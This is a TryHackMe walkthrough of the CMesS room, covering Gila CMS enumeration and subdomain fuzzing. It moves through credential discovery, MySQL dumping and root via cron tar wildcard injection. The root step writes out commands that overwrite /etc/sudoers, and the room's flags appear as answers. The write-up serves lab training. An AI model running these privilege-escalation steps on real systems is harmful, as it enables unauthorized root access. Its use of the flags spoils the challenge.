# CMesS — TryHackMe Walkthrough

> Can you root this Gila CMS box?

<p align="center">
  <img src="data:image/png;base64,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" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/cmess">
    <img src="https://img.shields.io/badge/TryHackMe-CMesS-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-DNS%20Enum%20%7C%20Gila%20CMS%20%7C%20Crontab%20%7C%20tar%20Wildcard-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | DNS Subdomain Enumeration |
| 4 | Stored Passwords and Keys |
| 5 | MySQL Enumeration |
| 6 | Backup File Inspection |
| 7 | Exploiting Crontab — tar Wildcard Injection |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform subdomain fuzzing using wfuzz to discover hidden virtual hosts
- Read a development log page to extract credentials left by developers
- Log in to a CMS admin panel and exploit file manager access for a reverse shell
- Extract database credentials from a CMS configuration file
- Enumerate a MySQL database to find password hashes
- Find a plaintext backup password in `/opt`
- Escalate privileges using tar wildcard injection against a cron job

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, wfuzz, and Netcat installed
- Add `Machine_IP cmess.thm` to `/etc/hosts` before starting
- Note: This box does not require brute forcing

---

## Task 1 — Flags

---

### Step 1 — /etc/hosts Configuration

**Approach:** Add the target to your hosts file so `cmess.thm` resolves correctly.

```
echo "Machine_IP cmess.thm" | sudo tee -a /etc/hosts
```

> **Note:** This machine uses virtual host routing — the CMS only responds correctly when the HTTP `Host` header is set to `cmess.thm`. Without this entry, the site may not render properly and subdomain enumeration will not work.

---

### Step 2 — Network Enumeration

**Approach:** Run an Nmap scan with service detection and default scripts to identify open ports.

```
kali@kali:~/CTFs/tryhackme/CMesS$ sudo nmap -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 20:16 CEST
Nmap scan report for Machine_IP
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds
```

> **Note:** Two ports are open — **SSH on 22** and **HTTP on 80**. Nmap's `http-generator` header immediately identifies **Gila CMS** as the web application. The `robots.txt` discloses three internal paths (`/src/`, `/themes/`, `/lib/`). Running `searchsploit Gila CMS` reveals known vulnerabilities including SQL injection and Local File Inclusion — worth noting for later.

---

### Step 3 — Web Directory Enumeration

**Approach:** Run Gobuster to map directories on the web server.

```
kali@kali:~/CTFs/tryhackme/CMesS$ gobuster dir -u Machine_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://Machine_IP
===============================================================
/index (Status: 200)
/about (Status: 200)
/blog (Status: 200)
/login (Status: 200)
/admin (Status: 200)
/themes (Status: 301)
/assets (Status: 301)
/sites (Status: 301)
/log (Status: 301)
/lib (Status: 301)
/src (Status: 301)
/fm (Status: 200)
/tmp (Status: 301)
===============================================================
2020/10/11 20:28:45 Finished
===============================================================
```

> **Note:** The `/admin` and `/fm` (file manager) paths are especially interesting. The admin panel at `http://cmess.thm/admin` is the login interface for Gila CMS. The file manager at `/fm` could allow arbitrary file uploads once authenticated. Before attempting a login, the next step is to find credentials through subdomain enumeration.

---

### Step 4 — DNS Subdomain Fuzzing with wfuzz

**Approach:** Use wfuzz to fuzz the `Host` header for virtual host subdomains of `cmess.thm`. Filter out responses with the same line count as the default page (107 lines) to find unique subdomains.

```
kali@kali:~/CTFs/tryhackme/CMesS$ wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000019:   200        30 L     104 W    934 Ch      "dev"
```

> **Note:** The subdomain **`dev.cmess.thm`** returns a different response (30 lines vs the default 107). Add it to `/etc/hosts`:
> ```
> echo "Machine_IP dev.cmess.thm" | sudo tee -a /etc/hosts
> ```
> Then browse to `http://dev.cmess.thm/` to read the development log.

---

### Step 5 — Reading the Development Log for Credentials

**Approach:** Navigate to `http://dev.cmess.thm/` to read the development changelog left by the team.

The development log contains:

```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

> **Note:** The support team left a **plaintext password** in a public-facing development log — a severe information disclosure vulnerability. The credentials are **`andre@cmess.thm:KPFTN_f2yxe%`**. Log in to `http://cmess.thm/admin` with these credentials. Once inside the CMS admin panel, use the file manager at `/fm` to upload a PHP reverse shell and trigger it to gain a shell as `www-data`.

---

### Step 6 — Reading the CMS Configuration File

**Approach:** After gaining a shell as `www-data`, read the Gila CMS configuration file to find database credentials.

```php
<?php

$GLOBALS['config'] = array (
  'db' =>
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);
```

> **Note:** The configuration file `/var/www/html/config.php` (or similar path) contains the MySQL root password **`r0otus3rpassw0rd`** in plaintext. CMS configuration files always contain database credentials — reading them is a standard step after gaining web server access.

---

### Step 7 — MySQL Enumeration

**Approach:** Connect to MySQL using the credentials from the config file and enumerate the `gila` database to find user hashes.

```
www-data@cmess:/var/www$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use gila;
Database changed

mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+
9 rows in set (0.00 sec)

mysql> SELECT * FROM user;
+----+----------+-----------------+--------------------------------------------------------------+--------+
| id | username | email           | pass                                                         | active |
+----+----------+-----------------+--------------------------------------------------------------+--------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |
+----+----------+-----------------+--------------------------------------------------------------+--------+
1 row in set (0.00 sec)
```

> **Note:** The user table contains `andre`'s bcrypt password hash. While this could be cracked offline, a faster path exists — a backup password file in `/opt`.

---

### Step 8 — Backup Password File and User Flag

**Approach:** Check `/opt` for any readable backup files.

```
www-data@cmess:/var/www$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/var/www$ su -l andre
Password:
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

> **Note:** `/opt/.password.bak` is a hidden file containing `andre`'s backup password in plaintext — **`UQfsdCB7aAP6`**. Always check `/opt` for backup and configuration files. Switching to `andre` with this password gives us the user flag.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}`**

</details>

---

### Step 9 — Privilege Escalation via tar Wildcard Injection in Crontab

**Approach:** Check `/etc/crontab` for scheduled tasks. A cron job runs `tar` as root on a directory that `andre` can write to. Use tar's `--checkpoint` flag injection (the same wildcard technique as Skynet) to execute a privilege escalation script as root.

Navigate to `andre`'s `backup` directory and create the exploit files:

```
andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh privesc.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```

Wait for the cron job to fire, then:

```
andre@cmess:~/backup$ sudo su
root@cmess:/home/andre/backup# cd /root/
root@cmess:~# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```

> **Note:** When `tar` runs with a wildcard (`*`) in the backup directory, filenames beginning with `--` are interpreted as `tar` command-line flags. The file named `--checkpoint=1` triggers a checkpoint after every file, and `--checkpoint-action=exec=sh privesc.sh` executes our script at each checkpoint. The `privesc.sh` script overwrites `/etc/sudoers` to grant `andre` passwordless sudo. Once the cron fires, `sudo su` gives immediate root access. This is the same tar wildcard injection technique used in the Skynet room.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`thm{9f85b7fdeb2cf96985bf5761a93546a2}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | `/etc/hosts` configuration | Mapped `Machine_IP` to `cmess.thm` |
| 2 | Nmap scan | Found SSH (22) and Gila CMS on HTTP (80) |
| 3 | Gobuster directory scan | Found `/admin`, `/fm`, and other CMS paths |
| 4 | wfuzz subdomain fuzzing | Discovered `dev.cmess.thm` |
| 5 | Development log inspection | Found plaintext credentials `andre@cmess.thm:KPFTN_f2yxe%` |
| 6 | CMS admin login + file manager upload | Gained reverse shell as `www-data` |
| 7 | Read `config.php` | Found MySQL root password `r0otus3rpassw0rd` |
| 8 | MySQL enumeration | Found `andre`'s bcrypt hash in `gila.user` table |
| 9 | Read `/opt/.password.bak` | Found backup password `UQfsdCB7aAP6`, switched to `andre`, read `user.txt` |
| 10 | tar wildcard injection in cron | Overwrote `/etc/sudoers`, gained root shell, read `root.txt` |
